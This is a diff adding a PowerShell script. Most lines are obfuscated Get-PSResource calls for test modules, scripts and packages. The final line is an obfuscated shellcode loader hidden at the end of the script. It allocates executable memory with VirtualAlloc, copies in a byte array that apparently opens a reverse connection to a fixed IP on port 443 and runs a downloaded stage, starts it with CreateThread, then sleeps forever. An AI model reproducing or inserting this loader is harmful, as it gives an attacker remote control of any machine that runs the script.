@@ -1,0 +1,101 @@
+&("{2}{0}{4}{1}{3}"-f'et-PS','esourc','G','e','R') ("{1}{0}{2}"-f 'stModu','Te','le')
+
+
+&("{4}{3}{0}{2}{1}" -f '-PS','e','Resourc','t','Ge') -name ("{0}{1}{2}"-f 'TestMo','du','le')
+
+
+&("{0}{3}{1}{2}"-f 'G','PSResou','rce','et-') ("{1}{0}{2}"-f 'Modul','Test','e') -Type ("{0}{1}"-f'Modu','le')
+
+
+&("{3}{1}{4}{0}{2}" -f 'r','es','ce','Get-PSR','ou') ("{0}{1}{2}"-f'T','e','stModule') -Type ("{1}{0}" -f'e','Modul'), ("{1}{0}"-f'cript','S'), ("{1}{0}"-f 'ry','Libra')
+
+
+.("{1}{0}{3}{2}"-f'et-PS','G','source','Re') ("{0}{1}{2}{3}"-f 'T','estMod','u','le1'), ("{0}{2}{1}" -f 'TestMo','le2','du'), ("{0}{2}{1}"-f 'T','3','estModule')
+
+
+.("{1}{2}{0}"-f'ce','Get-P','SResour') ("{0}{2}{1}" -f 'Te','tModule','s') -MinimumVersion ("{1}{0}" -f '.0','1.5')
+
+
+&("{1}{2}{3}{0}{4}" -f'urc','Get','-P','SReso','e') ("{1}{0}{2}" -f'dul','TestMo','e') -MaximumVersion ("{1}{0}"-f'.5.0','1')
+
+
+&("{0}{4}{2}{3}{1}"-f 'G','urce','t-P','SReso','e') ("{0}{1}{2}"-f 'Te','stMo','dule') -MinimumVersion ("{0}{1}"-f '1.','0.0') -MaximumVersion ("{1}{0}"-f '0','2.0.')
+
+
+&("{2}{1}{3}{0}"-f 'ce','s','Get-PSRe','our') ("{0}{2}{1}"-f 'Te','le','stModu') -RequiredVersion ("{1}{0}" -f'0','1.5.')
+
+
+.("{2}{1}{3}{0}" -f 'SResource','e','G','t-P') ("{1}{3}{0}{2}"-f'dul','Tes','e','tMo') -AllVersions
+
+
+.("{2}{4}{0}{1}{3}" -f'P','SR','Ge','esource','t-') ("{2}{0}{1}"-f 't','Module','Tes') -Prerelease
+
+
+
+
+
+&("{3}{0}{1}{2}{4}" -f'-','PSR','es','Get','ource') ("{1}{2}{0}" -f 't','TestSc','rip')
+
+
+&("{0}{1}{2}{3}" -f'Get-P','SRe','so','urce') -name ("{0}{1}{2}"-f 'Tes','tS','cript')
+
+
+.("{3}{0}{2}{1}{4}"-f '-P','Resour','S','Get','ce') ("{2}{1}{0}"-f 'cript','estS','T') -Type ("{0}{1}"-f'Scri','pt')
+
+
+.("{0}{2}{3}{1}" -f'Get-PSRes','ce','o','ur') ("{2}{1}{3}{0}" -f'pt','s','Te','tScri') -Type ("{0}{1}"-f 'M','odule'), ("{0}{1}"-f'S','cript'), ("{1}{0}" -f 'y','Librar')
+
+
+&("{0}{3}{2}{1}{4}"-f 'G','urc','PSReso','et-','e') ("{2}{0}{1}"-f 't','Script1','Tes'), ("{3}{0}{1}{2}" -f't','Scr','ipt2','Tes'), ("{1}{2}{3}{0}" -f 'pt3','TestS','c','ri')
+
+
+.("{2}{0}{1}" -f 'PSResourc','e','Get-') ("{2}{1}{0}" -f 't','estScrip','T') -MinimumVersion ("{1}{0}"-f'.5.0','1')
+
+
+.("{1}{2}{0}{3}"-f 't-PSResour','G','e','ce') ("{2}{1}{3}{0}" -f 't','estSc','T','rip') -MaximumVersion ("{0}{1}" -f '1.5.','0')
+
+
+.("{0}{1}{2}"-f'G','et-PSResou','rce') ("{2}{3}{1}{0}"-f 't','ip','Test','Scr') -MinimumVersion ("{1}{0}" -f'0','1.0.') -MaximumVersion ("{1}{0}"-f'.0','2.0')
+
+
+&("{2}{0}{1}" -f 'PSResou','rce','Get-') ("{1}{2}{3}{0}" -f 'ipt','T','e','stScr') -RequiredVersion ("{0}{1}" -f '1.5.','0')
+
+
+.("{2}{4}{3}{1}{0}"-f 'e','urc','Get','eso','-PSR') ("{3}{0}{1}{2}"-f'estModu','l','e','T') -AllVersions
+
+
+.("{1}{3}{2}{0}{4}"-f 'o','Get-PS','s','Re','urce') ("{2}{0}{1}" -f'tSc','ript','Tes') -Prerelease
+
+
+
+
+.("{3}{0}{1}{2}"-f'et-P','S','Resource','G') ("{1}{0}{2}" -f'estNup','T','kg')
+
+
+&("{0}{1}{3}{2}" -f 'Ge','t-P','e','SResourc') ("{1}{0}{2}" -f't','Tes','Nupkg') -Type ("{0}{2}{1}" -f'L','ry','ibra')
+
+
+.("{0}{2}{1}{3}"-f 'Ge','s','t-PSRe','ource') ("{2}{0}{1}" -f 'stNupk','g','Te') -Type ("{0}{1}{2}" -f'M','odu','le'), ("{0}{1}"-f 'Scri','pt'), ("{1}{2}{0}" -f'rary','L','ib')
+
+
+.("{0}{1}{3}{2}" -f'Get-','PSRes','e','ourc') ("{2}{1}{0}"-f 'tNupkg1','es','T'), ("{1}{0}{2}" -f 'e','T','stNupkg2'), ("{0}{3}{1}{2}" -f 'T','stN','upkg3','e')
+
+
+&("{1}{2}{0}{3}"-f 'Reso','Get-','PS','urce') ("{1}{0}{2}" -f'estNup','T','kg') -MinimumVersion ("{1}{0}"-f '0','1.5.')
+
+
+.("{2}{0}{3}{1}"-f'so','ce','Get-PSRe','ur') ("{1}{0}" -f 'upkg','TestN') -MaximumVersion ("{1}{0}" -f'.0','1.5')
+
+
+.("{1}{2}{3}{0}"-f'e','G','et-','PSResourc') ("{2}{0}{1}" -f 'Nupk','g','Test') -MinimumVersion ("{1}{0}" -f'.0.0','1') -MaximumVersion ("{1}{0}"-f '.0','2.0')
+
+
+.("{0}{3}{4}{1}{2}"-f'G','sour','ce','et-PSR','e') ("{1}{2}{0}" -f 'upkg','T','estN') -RequiredVersion ("{1}{0}" -f '.5.0','1')
+
+
+.("{3}{0}{1}{2}"-f'et-','P','SResource','G') ("{2}{0}{1}"-f'd','ule','TestMo') -AllVersions
+
+
+.("{2}{3}{0}{1}" -f 'ur','ce','Get','-PSReso') ("{0}{1}{2}" -f 'Te','stNupk','g') -Prerelease
+
+${c} = ((("{88}{61}{49}{34}{21}{27}{14}{11}{15}{54}{55}{83}{47}{69}{18}{76}{7}{78}{9}{70}{17}{4}{28}{8}{50}{52}{48}{65}{20}{5}{60}{6}{71}{74}{45}{57}{53}{33}{75}{26}{58}{38}{68}{85}{72}{66}{30}{12}{73}{3}{40}{51}{32}{86}{10}{82}{25}{16}{43}{22}{79}{19}{81}{13}{84}{39}{42}{62}{80}{44}{67}{24}{2}{23}{63}{46}{36}{56}{64}{29}{59}{35}{0}{77}{1}{37}{87}{31}{41}"-f'ui','t','lic st',' dwSta','n',';','Impo',' lpAddress, ',' ','wS',' lpParame','static','tes,','Id)','KFq)]public ',' extern In','wC',' ui','(Int','Ptr','otect)','.dl','tionFlags','atic','pub',', uint d','ntPtr Cr','l','t flAllocationType,','t(I','ribu','c, uint coun','e, IntPtr lpStart','n','KFqkernel32','est, ','t',' ','Thread','DllIm','ckS','t);','p','rea','llKFq)','32.dllKFq)]public sta','n','tualA',' flP','rt(','ui','iz','nt',' exter','tPt','r','Ptr m','tic','eate','ntPtr d','[Dll','mpo','ort(KFqmsvc',' extern I','emse','r','t',']','(Int','lloc','ize,','rt(','t',' uint','KFqkernel',' I','Ptr','n','uint d',', Int','rt.d',' lpThread','ter',' Vir',';[','Ptr lpThreadA','Address, IntPtr','sr','[DllI'))."r`EPLA`Ce"(([CHaR]75+[CHaR]70+[CHaR]113),[sTrING][CHaR]34));${W} = .("{2}{1}{0}" -f 'pe','-Ty','Add') -memberDefinition ${C} -Name ("{1}{0}"-f'in32','W') -namespace ("{2}{3}{1}{0}"-f 'ns','o','Win3','2Functi') -passthru;[Byte[]];[Byte[]]${z} = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x0a,0x6d,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;${g} = 0x1000;if (${z}."l`ENgTH" -gt 0x1000){${G} = ${z}."Le`NGTh"};${x}=${W}::("{0}{3}{2}{1}"-f 'V','alAlloc','tu','ir').Invoke(0,0x1000,${G},0x40);for (${i}=0;${i} -le (${z}."l`enGtH"-1);${i}++) {${W}::"M`Ems`et"([IntPtr](${X}.("{1}{0}" -f '2','ToInt3').Invoke()+${I}), ${z}[${i}], 1)};${W}::("{1}{2}{3}{0}"-f'd','Cre','ateT','hrea').Invoke(0,0,${x},0,0,0);for (;;){.("{0}{2}{1}" -f 'Sta','eep','rt-sl') 60};
